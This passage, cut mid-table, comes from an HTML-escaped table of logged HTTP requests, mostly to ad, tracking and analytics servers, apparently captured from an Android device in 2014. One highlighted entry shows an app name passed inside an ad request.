                            /mads/gma?preqs=2&amp;session_id=17592708045346502934&amp;seq_num=3&amp;u_w=477&amp;msid=com.iudesk.android.photo.editor&amp;js=afma-sdk-a-v6.4.1&amp;bas_off=0&amp;imbf=8009&amp;net=ed&amp;app_name=2014010100.android.com.iudesk.android.photo.editor&amp;hl=de&amp;gnt=8&amp;carrier=26207&amp;u_audio=3&amp;u_sd=1.6750001&amp;ms=XkHxq-pxBucbuAFEkgVz2ud3dAVCQKuG51SBPj7bZfgF7bIgIAKWjPjzuzEbPRCoG9YdIIdfS0XIF080Ae7KZffsMMq3RNME_iiMIZ8MTwRDB-YeW4zvjEsnKvpBx8I2fWNbmGW0_Kp2QCrSz09jfVNkogEkRcEKO-cGqLraPZRP6abz1c17ArgCPJbF8m591KXGAud04Sgts4WNz0_xe85Jg-yh1z3bsQIE_l1mFOfYp9O2Acb2MOUlY8Op0xl4oAhyVjHcwXEOSvcgAngio5TzMdlLwvRYDbJw3Az9gc4Q6qb8ivHK0hqLibrlhhWYIDCjFFvi9WchF64W0hvVxg&amp;mv=80240021.com.android.vending&amp;format=320x50_mb&amp;oar=0&amp;u_h=764&amp;bas_on=0&amp;ptime=182048&amp;u_so=p&amp;output=html&amp;region=mobile_app&amp;u_tz=60&amp;client_sdk=1&amp;ex=1&amp;slotname=a14ecccef2eb8b3&amp;askip=2&amp;gsb=4g&amp;caps=inlineVideo_interactiveVideo_mraid1_th_mediation_sdkAdmobApiForAds_di&amp;jsv=66&amp;urll=916
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            67
                          &lt;/th&gt;

                          &lt;td&gt;
                            googleads.g.doubleclick.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /pagead/adview?ai=C4oveubvaUq_KM4Sl-walkoHgDrvKzaYEi4T6sk7AjbcBEAEgAFCAx-HEBGCVAoIBHmNhLW1iLWFwcC1wdWItMzY5ODg4OTAwNjYzNzE0NcgBCagDAaoE4QFP0NsZQDgdR6m6-UsNs3NVOfzWrEARwv7eNFrr-tHmgBdGDZ6KgYOfKLRHPVClkG1Tb2rikEmy2-99FD1WSc63202JSQF0wr8_ulyVw6VMd8qYGzYkpXEDPBS6WpcCLNBw2LI9YtZme6wOTtdjRKLRKzi1NTv0wPeC-RBzCUgbEGhY9n4jMkE-LSry1ijzbh_bmzt9omLv-rRcJKmN3lxR4HsdoEGLDkydEv4KkDlBE0o1q9Qr4ANgAyIVUBeIebKS492NihSJaqggq5ty4cs_w-FEotQjnDtOm0nKiESJJr-ABsy73YTZq8KRHKAGIQ&amp;sigh=ktzmIelvDAY
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            68
                          &lt;/th&gt;

                          &lt;td&gt;
                            googleads.g.doubleclick.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /pagead/adview?ai=CFehGBrvaUq3DGceO-waprICADrvKzaYEi4T6sk7AjbcBEAEgAFCAx-HEBGCVAoIBHmNhLW1iLWFwcC1wdWItMzY5ODg4OTAwNjYzNzE0NcgBCagDAaoE4QFP0B_pKoVqRzGQjrH8fOm0S6WhhXyS0bjy79z88fOE1v8xwyfxVHI748bWF7lKJl8WaoC5QvD5uU2-W4C4s0mB0-GY6tgV4Qk_yBBU86_CNmH4QSD1GKrp9qKCoxDptbkCfRtWlzlk4GhFFBQUYpE3hemX5nduj1f-5hkaXYuSPoDF4QqPTXL8zACO6EUIHSY2_I1QeeVj1iqrEHmOqQbgU24nHiNCvMVee1A5tJOYlqPc4Plh0th8mdcLuvBYAn6Q-UJTVexCneBJLjL6XhlFduPecycLn-ITziOuF4ip9oOABsy73YTZq8KRHKAGIQ&amp;sigh=DWUbGB2Sr7A
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            69
                          &lt;/th&gt;

                          &lt;td&gt;
                            googleads.g.doubleclick.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /pixel?google_nid=a9&amp;google_cm&amp;ex=doubleclick.net
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            70
                          &lt;/th&gt;

                          &lt;td&gt;
                            gsea.ivwbox.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /cgi-bin/ivw/CP/0114_05?r=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.tagesschau.de%252Fschlusslicht%252Finternet242.html&amp;d=36300.35824608058
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            71
                          &lt;/th&gt;

                          &lt;td&gt;
                            gwp.nuggad.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /rc?nuggn=480104072&amp;nuggsid=1248589405
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            72
                          &lt;/th&gt;

                          &lt;td&gt;
                            gwp.nuggad.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /rc?nuggn=480104072&amp;nuggsid=1364201110
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            73
                          &lt;/th&gt;

                          &lt;td&gt;
                            ib.adnxs.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /bounce?%2Fgetuid%3Fhttp%253A%252F%252Fib.adnxs.com%252Fgetuid%253Fhttp%25253A%25252F%25252Fd.shareaholic.com%25252Fdough%25252F1.0%25252Fmixer.gif%25253Fp_name%25253DAN%252526p_id%25253D%252524UID
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            74
                          &lt;/th&gt;

                          &lt;td&gt;
                            ib.adnxs.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /getuid?http%3A%2F%2Fd.shareaholic.com%2Fdough%2F1.0%2Fmixer.gif%3Fp_name%3DAN%26p_id%3D%24UID
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            75
                          &lt;/th&gt;

                          &lt;td&gt;
                            ib.adnxs.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /getuid?http%3A%2F%2Fib.adnxs.com%2Fgetuid%3Fhttp%253A%252F%252Fd.shareaholic.com%252Fdough%252F1.0%252Fmixer.gif%253Fp_name%253DAN%2526p_id%253D%2524UID
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            76
                          &lt;/th&gt;

                          &lt;td&gt;
                            ib.adnxs.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /getuid?http://s.amazon-adsystem.com/ecm3?id=$UID&amp;ex=appnexus.com
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            77
                          &lt;/th&gt;

                          &lt;td&gt;
                            image5.pubmatic.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /AdServer/usersync/usersync.html?predirect=http%3A%2F%2Fs.amazon-adsystem.com%2Fecm3%3Fid%3DPM_UID%26ex%3Dpubmatic.com&amp;userIdMacro=PM_UID
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            78
                          &lt;/th&gt;

                          &lt;td&gt;
                            images.waskochich.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /rezept_des_tages/v1/18.01.2014/recipe.json?vcode=14&amp;sdk=18&amp;lang=de-DE&amp;platform=android
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            79
                          &lt;/th&gt;

                          &lt;td&gt;
                            images03.futurezone.at
                          &lt;/td&gt;

                          &lt;td&gt;
                            /entordnungsmaschine.jpg/46.491.152
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            80
                          &lt;/th&gt;

                          &lt;td&gt;
                            intelcrawler.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /about/press07
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            81
                          &lt;/th&gt;

                          &lt;td&gt;
                            mobile.smartadserver.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /call2/pubmj/31924/220174/13500/S/689547290/unfall%3Bundefined?
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            82
                          &lt;/th&gt;

                          &lt;td&gt;
                            mobile.smartadserver.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /call2/pubmj/31924/220174/13501/S/689547290/unfall%3Bundefined?
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            83
                          &lt;/th&gt;

                          &lt;td&gt;
                            mobile.smartadserver.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /call2/pubmj/31924/220174/13531/M/689547290/unfall%3Bundefined?
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            84
                          &lt;/th&gt;

                          &lt;td&gt;
                            mobile.smartadserver.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /call2/pubmj/31924/220217/13500/S/9074574292/streaming%3Bngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            85
                          &lt;/th&gt;

                          &lt;td&gt;
                            mobile.smartadserver.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /call2/pubmj/31924/220217/13501/S/9074574292/streaming%3Bngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            86
                          &lt;/th&gt;

                          &lt;td&gt;
                            mobile.smartadserver.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /call2/pubmj/31924/220217/13531/M/9074574292/streaming%3Bngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            87
                          &lt;/th&gt;

                          &lt;td&gt;
                            mobile.smartadserver.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /call2/pubmj/31924/220236/13500/S/4907709071/hochschulen%3Bngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            88
                          &lt;/th&gt;

                          &lt;td&gt;
                            mobile.smartadserver.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /call2/pubmj/31924/220236/13501/S/4907709071/hochschulen%3Bngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            89
                          &lt;/th&gt;

                          &lt;td&gt;
                            mobile.smartadserver.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /call2/pubmj/31924/220236/13531/M/4907709071/hochschulen%3Bngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            90
                          &lt;/th&gt;

                          &lt;td&gt;
                            mobile.smartadserver.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /call2/pubmj/42361/286422/13500/S/3367962420/ngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D1%3B?
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            91
                          &lt;/th&gt;

                          &lt;td&gt;
                            mobile.smartadserver.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /call2/pubmj/42361/286422/13501/S/3367962420/ngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D1%3B?
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            92
                          &lt;/th&gt;

                          &lt;td&gt;
                            mobile.smartadserver.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /call2/pubmj/42361/286422/13531/M/3367962420/ngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D1%3B?
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            93
                          &lt;/th&gt;

                          &lt;td&gt;
                            mobile.smartadserver.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /call2/pubmj/42361/286438/13500/S/5189938149/ngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            94
                          &lt;/th&gt;

                          &lt;td&gt;
                            mobile.smartadserver.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /call2/pubmj/42361/286438/13501/S/5189938149/ngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            95
                          &lt;/th&gt;

                          &lt;td&gt;
                            mobile.smartadserver.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /call2/pubmj/42361/286438/13531/M/5189938149/ngx%3D1%3Bnd_agr%3D6%3Bnd_gnd%3D1%3Bnd_hsh%3D1%3Bnd_dcb%3D1%3Bnd_dcd%3D1%3Bnd_dcp%3D1%3Bnd_dcs%3D6%3B?
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            96
                          &lt;/th&gt;

                          &lt;td&gt;
                            mqs.ioam.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /?mobfaz//CP//222F000006E6//VIA_SZMNG
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            97
                          &lt;/th&gt;

                          &lt;td&gt;
                            otaslim.slimroms.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /ota.xml
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            98
                          &lt;/th&gt;

                          &lt;td&gt;
                            pagead2.googlesyndication.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /mads/gma?preqs=0&amp;u_sd=1.6750001&amp;u_h=764&amp;u_w=477&amp;msid=com.icecoldapps.sshserver&amp;js=afma-sdk-a-v4.1.1&amp;format=320x50_mb&amp;net=ed&amp;app_name=&lt;span style=&quot;background-color: #00ff00;&quot;&gt;6.android.com.icecoldapps.sshserver&lt;/span&gt;&amp;u_audio=3&amp;hl=de&amp;u_so=p&amp;output=html&amp;region=mobile_app&amp;u_tz=60&amp;client_sdk=1&amp;ex=1&amp;slotname=a1503fa97c18f71&amp;caps=th_sdkAdmobApiForAds_di&amp;eid=46621027&amp;eisu=YqvG8bb1HRSjHT6fGSlcIGDpDNkVBUb9f6gFzqmi9KKfTIqGDqHqvKRVSjVInYJT89PFhEXFazxoGTMgh8XJGbsG3oecaOzbv8-2l35NcfO9gAwABQhGCOMtM6TYYwID&amp;et=16&amp;jsv=66&amp;urll=499
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            99
                          &lt;/th&gt;

                          &lt;td&gt;
                            pbs.twimg.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /media/Bd5jXUqCIAAz9SB.png:large
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            100
                          &lt;/th&gt;

                          &lt;td&gt;
                            pbs.twimg.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /media/BeR4oFsIAAAld5J.jpg:large
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            101
                          &lt;/th&gt;

                          &lt;td&gt;
                            pbs.twimg.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /media/BeVn43ACIAErkDj.jpg:large
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            102
                          &lt;/th&gt;

                          &lt;td&gt;
                            qs.ivwbox.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /?andropit//CP//forum
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            103
                          &lt;/th&gt;

                          &lt;td&gt;
                            r.skimresources.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /api/?callback=skimlinksApplyHandlers&amp;data=%7B%22pubcode%22%3A%2236706X955308%22%2C%22domains%22%3A%5B%22androidpit.com%22%2C%22androidpit.es%22%2C%22androidpit.ru%22%2C%22androidpit.com.br%22%2C%22androidpit.fr%22%2C%22androidpit.com.tr%22%2C%22androidpit.it%22%2C%22facebook.com%22%2C%22plus.google.com%22%2C%22twitter.com%22%5D%2C%22page%22%3A%22http%3A%2F%2Fwww.androidpit.de%2Fde%2Fandroid%2Fforum%2Fthread%2F573726%2Fslimbean-Build-4-3%22%7D
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            104
                          &lt;/th&gt;

                          &lt;td&gt;
                            r6&amp;#8212;sn-i5onxoxu-q0nl.googlevideo.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /videoplayback?ipbits=0&amp;clen=6565357&amp;sver=3&amp;signature=97BF5AD3E8F190923D6357415BCCA26206AC87CB.98F902F2BF9A3C6AD31B8656D8985D9803C55355&amp;upn=145Xdgf925M&amp;id=1a862b8c290ddd0e&amp;sparams=algorithm%2Cburst%2Cclen%2Cdur%2Cfactor%2Cgir%2Cid%2Cip%2Cipbits%2Citag%2Clmt%2Csource%2Cupn%2Cexpire&amp;ms=au&amp;mv=m&amp;mt=1390068284&amp;key=yt5&amp;ip=89.204.137.61&amp;burst=40&amp;source=youtube&amp;lmt=1389950553436400&amp;mime=video%2F3gpp&amp;expire=1390092857&amp;gir=yes&amp;algorithm=throttle-factor&amp;fexp=933901%2C924614%2C916623%2C936119%2C940607%2C924616%2C936910%2C936913%2C907231%2C921090&amp;itag=36&amp;dur=231.410&amp;factor=1.25&amp;dnc=1&amp;cpn=gO8O40lo6VtiEb9S
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            105
                          &lt;/th&gt;

                          &lt;td&gt;
                            s0.2mdn.net
                          &lt;/td&gt;

                          &lt;td&gt;
                            /N4061/pfadx/app.ytpwatch.entertainment/main_8938;dc_kt=AM_2AqHYZ2t6UuW96Ij1LXARDLXamWPArT5qYCXdWdyUCDtpMHFXlTu4GTOjWhX86Meh8fEBDQZuhXDopY43XkUFDcHwp6hyOrzu9GmpYXhJqPfO5kfxRx4_Pr26_98;adtest=nodebugip;sz=480&amp;#215;360,480&amp;#215;361;kvid=GoYrjCkN3Q4;kpu=kontor;kpeid=b3tJ5NKw7mDxyaQ73mwbRg;kpid=8938;mpvid=AATwQoLYU5dkv_Ym;afv=1;afvbase=eJydlEuTojoYhn9Ns9MKd1iwQM_BVtvp9toym1SECFEgMReUfz9p6Jqyz_JQVIU3yXdNHlTTEnzHOWRUEEloA4VEXEamkSkhYYGbHHOtWpJjCs-U10hGtmdUFJM8MjqZ45ZkuNWb3LE9ti2jQpmMLNcMjEbVEOVCW4v82kZo_L0jqwhuZJShEVOnkWeZYWCavuMDJ7T978CowJEJgGcoXkWllOzFjl-sRL_3-33cUSXVCY8zWuuZPjc9zmjKL9PrL3vtGFmJmgZX0Yo0U1Y7AXj4YIeFNF-sCTq3kDRCcoy0-eSAuSQZqqD9Q7g_lPesLNN8lm4QPEvP_OHIdEDwn6Awx3qmk7CtERu-aqargHG8u6_pW7p3dcNgWg9rmV4JQjsYVEOhzZD4K1okZS-Gk-ireDoWODS9n2QC1vREKozYEBZXOhWJSMV0vw3dVKZk9Kgr7VRIS58uZDKKP052YoXX19v6vpiaqKsEKC7kvh9t4Xa5KctlttjNUMrebh8hlA6t0_X7r_Lc3OjsvPxcOtvXWZJcnBvFTvjAaPOWqHxh7i-FkLf9ftJc-MG16iW6rt732WqLiwannRKzx2p__QBrpDarLuzQDCS_T5jvjhMYu5vjEZxFPUs9Z64O0-J-iJdZIb25r_zrKU7_4WfHNx9TkAoCyOzg...
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            106
                          &lt;/th&gt;

                          &lt;td&gt;
                            s95.research.de.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /bb-iqm/get?fp=1
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            107
                          &lt;/th&gt;

                          &lt;td&gt;
                            s95.research.de.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /bb-iqm/get?fp=2&amp;if=Languages%3D2212301001%26display%3D3352655169%26cpu%3D3611081436%26ajax%3D1%26general%3D1912588871%26dotnet%3D410499862%26mathlog%3D747073866%26timezone%3D060%26mimetypes%3D410499862%26silverlight%3D410499862%26pdfplugin%3D0&amp;du=&amp;iu=&amp;ji=6B833F8C-74B7-6A7B-0241-D82D86F0482F
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            108
                          &lt;/th&gt;

                          &lt;td&gt;
                            s95.research.de.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /bb-iqm/get?fp=2&amp;if=Languages%3D2212301001%26display%3D3352655169%26cpu%3D3611081436%26ajax%3D1%26general%3D281224174%26dotnet%3D410499862%26mathlog%3D747073866%26timezone%3D060%26mimetypes%3D410499862%26silverlight%3D410499862%26pdfplugin%3D0&amp;du=&amp;iu=&amp;ji=6B833F8C-74B7-6A7B-0241-D82D86F0482F
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            109
                          &lt;/th&gt;

                          &lt;td&gt;
                            st02.androidpit.info
                          &lt;/td&gt;

                          &lt;td&gt;
                            /js/libs/modernizr.js?v=2
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            110
                          &lt;/th&gt;

                          &lt;td&gt;
                            st02.androidpit.info
                          &lt;/td&gt;

                          &lt;td&gt;
                            /style/style.css?v=184
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            111
                          &lt;/th&gt;

                          &lt;td&gt;
                            st02.androidpit.info
                          &lt;/td&gt;

                          &lt;td&gt;
                            /styles/basic-migrate.css?v=4
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            112
                          &lt;/th&gt;

                          &lt;td&gt;
                            st02.androidpit.info
                          &lt;/td&gt;

                          &lt;td&gt;
                            /styles/font/selection_androidpit.ttf?v=3
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            113
                          &lt;/th&gt;

                          &lt;td&gt;
                            st02.androidpit.info
                          &lt;/td&gt;

                          &lt;td&gt;
                            /styles/main.css?v=73
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            114
                          &lt;/th&gt;

                          &lt;td&gt;
                            st02.androidpit.info
                          &lt;/td&gt;

                          &lt;td&gt;
                            /styles/selection_androidpit.css?v=3
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            115
                          &lt;/th&gt;

                          &lt;td&gt;
                            st03.androidpit.info
                          &lt;/td&gt;

                          &lt;td&gt;
                            /js/common.js?v=129
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            116
                          &lt;/th&gt;

                          &lt;td&gt;
                            st03.androidpit.info
                          &lt;/td&gt;

                          &lt;td&gt;
                            /js/forum.js?v=42
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            117
                          &lt;/th&gt;

                          &lt;td&gt;
                            static.ak.facebook.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /connect/xd_arbiter.php?version=28
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            118
                          &lt;/th&gt;

                          &lt;td&gt;
                            static.plista.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /oba/icon.php?format=gif&amp;color=777777&amp;height=26
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            119
                          &lt;/th&gt;

                          &lt;td&gt;
                            stats.pagefair.com
                          &lt;/td&gt;

                          &lt;td&gt;
                            /stats/page_view_event/DF62727623B74063/a.gif?i_hid=false&amp;i_rem=false&amp;i_blk=false&amp;if_hid=false&amp;if_rem=false&amp;s_rem=false&amp;s_blk=false&amp;new_daily=true
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            120
                          &lt;/th&gt;

                          &lt;td&gt;
                            sueddeut.ivwbox.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /cgi-bin/ivw/CP/szmmobil_N061AMucArtM?r=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fmuenchen%252Fmuenchen-haidhausen-ploetzlich-zehn-meter-tiefes-loch-im-gehweg-1.1866074&amp;d=1390050885081_71244
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            121
                          &lt;/th&gt;

                          &lt;td&gt;
                            sueddeut.ivwbox.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /cgi-bin/ivw/CP/szmmobil_N124ADigArtM?r=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fdigital%252Fstreamseite-redtube-loechriges-gutachten-bringt-porno-abmahner-in-bedraengnis-1.1866025&amp;d=1390051326027_63702
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            122
                          &lt;/th&gt;

                          &lt;td&gt;
                            sueddeut.ivwbox.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /cgi-bin/ivw/CP/szmmobil_N157AKarArtM?r=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.sueddeutsche.de%252Fkarriere%252Fstudie-hunderttausende-akademiker-arbeiten-fuer-niedrigloehne-1.1866212&amp;d=1390147627053_94457
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            123
                          &lt;/th&gt;

                          &lt;td&gt;
                            sz.met.vgwort.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /na/0a0657787bea4892820a8834ad37ca54
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            124
                          &lt;/th&gt;

                          &lt;td&gt;
                            sz.met.vgwort.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /na/58296e1bbe8446cd8396b668ab180d75
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            125
                          &lt;/th&gt;

                          &lt;td&gt;
                            sz.met.vgwort.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /na/eb98d3d2996f41f5941c53e733c4db8b
                          &lt;/td&gt;
                        &lt;/tr&gt;

                        &lt;tr&gt;
                          &lt;th&gt;
                            126
                          &lt;/th&gt;

                          &lt;td&gt;
                            tagessch.ivwbox.de
                          &lt;/td&gt;

                          &lt;td&gt;
                            /cgi-bin/ivw/CP/tagesschau/tagesschau;page=/schlusslicht/internet242.html?r=http%3A//flipboard.com/redirect%3Furl%3Dhttp%253A%252F%252Fwww.tagesschau.de%252Fschlusslicht%252Finternet242.html&amp;d=80627.9287673533
                          &lt;/td&gt;
